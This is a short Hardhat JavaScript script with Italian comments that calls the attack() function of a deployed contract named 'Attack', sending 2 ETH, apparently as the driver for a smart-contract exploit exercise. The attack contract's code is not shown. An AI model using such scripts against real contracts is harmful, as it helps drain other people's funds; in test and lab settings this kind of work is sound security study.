// attack.js MODIFICATO
const { ethers } = require("hardhat");

// Inserisci qui l'indirizzo del contratto ATTACK deployato
const ATTACK_CONTRACT_ADDRESS = "0x1Ae0817d98a8A222235A2383422e1A1c03d73e3a"; 

async function main() {
  const [attackerSigner] = await ethers.getSigners();
  const attackContract = await ethers.getContractAt("Attack", ATTACK_CONTRACT_ADDRESS);

  console.log("Avvio attacco...");
  const tx = await attackContract.attack({ value: ethers.utils.parseEther("2.0") });
  await tx.wait();

  console.log("Attacco eseguito. Controlla i log della transazione.");
}

main().catch((error) => {
  console.error("Errore:", error);
  process.exit(1);
});